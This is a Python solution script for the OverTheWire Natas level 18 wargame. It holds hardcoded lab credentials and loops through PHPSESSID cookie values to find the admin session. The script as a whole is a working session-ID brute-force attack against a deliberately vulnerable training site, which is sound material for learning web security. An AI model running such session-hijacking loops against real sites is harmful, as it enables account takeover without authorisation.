import requests

url = "http://natas18.natas.labs.overthewire.org/index.php"
auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")

max_id = 640

for i in range(0, max_id + 1):
    cookie = f"PHPSESSID={str(i)}"

    headers = {'Cookie': cookie}

    print(f'[+] Getting {cookie}')
    response = requests.get(url, headers=headers, auth=auth)

    if "You are logged in as a regular user" not in response.text:
        print(f"\n[✅] Admin PHPSESSID is: {i}")
        break